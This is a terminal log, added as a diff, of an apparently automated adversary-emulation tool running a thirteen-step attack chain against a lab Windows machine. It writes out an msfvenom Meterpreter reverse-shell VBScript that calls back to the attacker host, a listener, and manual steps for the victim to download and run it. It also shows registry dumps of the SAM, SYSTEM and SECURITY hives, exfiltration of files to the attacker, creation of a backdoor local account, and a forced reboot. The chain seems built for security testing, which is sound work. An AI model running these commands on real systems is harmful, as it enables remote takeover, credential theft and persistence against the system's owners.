@@ -1,0 +1,283 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260715T033506Z-78114f34/chain-002]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the VBScript file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacker machine
+➤ Enter value for LPORT (current: 4444 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.vbs' , required: True): 
+
+[MSFVenom] Command to run:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.43 LPORT=4444 -f vbs -o /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.vbs
+Run this MSFVenom command? [y/n] (y): 
+[MSFVenom] Running... (may take 5-10s)
+✓ MSFVenom payload generated successfully
+
+📌[Metasploit Executor] Step 2
+
+📌[Name] Set an MSF payload handler for a file-backed payload
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: False): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: False): 
+ Parameter Input
+  Parameter: payload_name
+  Description: payload type set by msf
+➤ Enter value for payload_name (current: 'windows/meterpreter/reverse_tcp' , required: False): 
+[*] Executing exploit=exploit/multi/handler payload=windows/meterpreter/reverse_tcp
+[+] Handler active — job 33: Exploit: multi/handler
+✓ Handler active — job 33, awaiting callback
+No active sessions found after 20s.
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_mp.vbs' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the file on the attacker's machine                          │
+│ 3. Download the file to C:\Users\Public\chain_mp.vbs                                   │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Human] Step 4
+
+📌[Name] Simulate the victim execute a VBScript file on its machine
+ Parameter Input
+  Parameter: VBS_PATH
+  Description: Saved path of the VBScript file on the victim machine
+  ✓ Using stored value: C:\Users\Public\chain_mp.vbs
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, use PowerShell or Command Prompt, or the Run dialog)             │
+│ wscript.exe C:\Users\Public\chain_mp.vbs                                               │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 5
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [146] meterpreter — WIN-BASE\useradmin @ WIN-BASE (192.168.56.65:49744)
+➤ Session id to accept (default: 146, or 'n' to abort chain): 
+
+📌[Meterpreter Executor] Step 6
+
+📌[Name] Process Grep
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[146] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 146
+Set the default session id as: 146!
+Selected meterpreter session: 146
+ Parameter Input
+  Parameter: pattern
+  Description: Process-name pattern
+➤ Enter value for pattern (current: 'explorer' , required: True): 
+
+[Meterpreter Executor] Executing: pgrep
+Keep going with the next attack step? [y/n] (y): 
+4268
+
+
+📌[Human] Step 7
+
+📌[Name] Simulate the victim execute a VBScript file on its machine as Admin
+ Parameter Input
+  Parameter: VBS_PATH
+  Description: Saved path of the VBScript file on the victim machine
+  ✓ Using stored value: C:\Users\Public\chain_mp.vbs
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, open an ELEVATED PowerShell or Command Prompt)                   │
+│ wscript.exe C:\Users\Public\chain_mp.vbs                                               │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 8
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: ['146']
+  Newly detected session(s):
+    [147] meterpreter — WIN-BASE\useradmin @ WIN-BASE (192.168.56.65:49745)
+➤ Session id to accept (default: 147, or 'n' to abort chain): 
+
+📌[Meterpreter Session Derive] Step 9
+📌[Name] Get an Interactive Shell on Windows
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[146] WIN-BASE\useradmin @ WIN-BASE
+[147] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 147
+Set the default session id as: 147!
+Selected meterpreter session: 147
+  ↳ Derived executor_derived executor from Meterpreter session 147
+
+📌[Command Prompt Executor] Step 10
+
+📌[Name] Registry dump of SAM, creds, and secrets
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke reg save.
+  ✓ Using stored value: 147
+ Parameter Input
+  Parameter: save_dir
+  Description: Directory on the target where the SAM / SYSTEM / SECURITY hives are written.
+➤ Enter value for save_dir (current: 'C:\\Users\\Public' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  reg save HKLM\sam C:\Users\Public\sam
+reg save HKLM\system C:\Users\Public\system
+reg save HKLM\security C:\Users\Public\security
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: reg save HKLM\sam C:\Users\Public\sam
+Output:
+The operation completed successfully.
+
+Executing: reg save HKLM\system C:\Users\Public\system
+Output:
+The operation completed successfully.
+
+Executing: reg save HKLM\security C:\Users\Public\security
+Output:
+The operation completed successfully.
+
+
+📌[Meterpreter Executor] Step 11
+
+📌[Name] File Download Operation
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  ✓ Using stored value: 146
+ Parameter Input
+  Parameter: remote_path
+  Description: Full path to remote file/directory
+➤ Enter value for remote_path (current: 'C:\\Users\\Public' , required: True): 
+ Parameter Input
+  Parameter: output_dir
+  Description: Local directory to save files
+➤ Enter value for output_dir (current: '/tmp' , required: True): 
+
+[Meterpreter Executor] Executing: download
+Keep going with the next attack step? [y/n] (y): 
+[*] mirroring  : C:\Users\Public\AccountPictures -> /tmp/AccountPictures
+[*] downloading: C:\Users\Public\AccountPictures\desktop.ini -> /tmp/AccountPictures/desktop.ini
+[*] Skipped    : C:\Users\Public\AccountPictures\desktop.ini -> /tmp/AccountPictures/desktop.ini
+[*] mirrored   : C:\Users\Public\AccountPictures -> /tmp/AccountPictures
+[*] downloading: C:\Users\Public\bits_download.dat -> /tmp/bits_download.dat
+[*] Completed  : C:\Users\Public\bits_download.dat -> /tmp/bits_download.dat
+[*] downloading: C:\Users\Public\chain_mp.hta -> /tmp/chain_mp.hta
+
+
+📌[Command Prompt Executor] Step 12
+
+📌[Name] Create a new user in a command prompt
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke net user.
+  ✓ Using stored value: 147
+ Parameter Input
+  Parameter: username
+  Description: Local account name to create.
+➤ Enter value for username (current: 'AuroraSvc003' , required: True): 
+ Parameter Input
+  Parameter: password
+  Description: Password for the new account.
+➤ Enter value for password (current: 'CplexPass!23' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  net user /add "AuroraSvc003" "CplexPass!23"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: net user /add "AuroraSvc003" "CplexPass!23"
+Output:
+The command completed successfully.
+
+
+📌[Meterpreter Executor] Step 13
+
+📌[Name] Reboot Remote System
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  ✓ Using stored value: 147
+
+[Meterpreter Executor] Executing: reboot
+Keep going with the next attack step? [y/n] (y): 
+[+] Reboot command sent — target session will terminate.
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                           Start                    End                      Duration  Status
+   1  Build the VBScript file of a Meterpreter session (for Windows) using MSFVenom  2026-07-17 21:56:01 UTC  2026-07-17 21:56:07 UTC      5.9s    ✓   
+   2  Set an MSF payload handler for a file-backed payload                           2026-07-17 21:56:07 UTC  2026-07-17 21:56:38 UTC     31.8s    ✓   
+   3  Simulate the victim download a file on its machine                             2026-07-17 21:56:38 UTC  2026-07-17 21:57:05 UTC     26.9s    ✓   
+   4  Simulate the victim execute a VBScript file on its machine                     2026-07-17 21:57:05 UTC  2026-07-17 21:57:19 UTC     13.6s    ✓   
+   5  Execute a Meterpreter Payload                                                  2026-07-17 21:57:19 UTC  2026-07-17 21:57:22 UTC      3.3s    ✓   
+   6  Process Grep                                                                   2026-07-17 21:57:22 UTC  2026-07-17 21:57:27 UTC      5.0s    ✓   
+   7  Simulate the victim execute a VBScript file on its machine as Admin            2026-07-17 21:57:27 UTC  2026-07-17 21:57:34 UTC      6.4s    ✓   
+   8  Execute a Meterpreter Payload                                                  2026-07-17 21:57:34 UTC  2026-07-17 21:57:35 UTC      1.1s    ✓   
+   9  Get an Interactive Shell on Windows                                            2026-07-17 21:57:35 UTC  2026-07-17 21:57:37 UTC      2.3s    ✓   
+  10  Registry dump of SAM, creds, and secrets                                       2026-07-17 21:57:37 UTC  2026-07-17 21:57:44 UTC      7.4s    ✓   
+  11  File Download Operation                                                        2026-07-17 21:57:44 UTC  2026-07-17 21:57:50 UTC      5.8s    ✓   
+  12  Create a new user in a command prompt                                          2026-07-17 21:57:50 UTC  2026-07-17 21:58:00 UTC      9.5s    ✓   
+  13  Reboot Remote System                                                           2026-07-17 21:58:00 UTC  2026-07-17 21:58:04 UTC      4.5s    ✓   
+
+  Total: 13 steps executed (13 ✓, 0 ?, 0 ✗) in 2m 3s
+══════════════════════════════════════════════════════════════════════
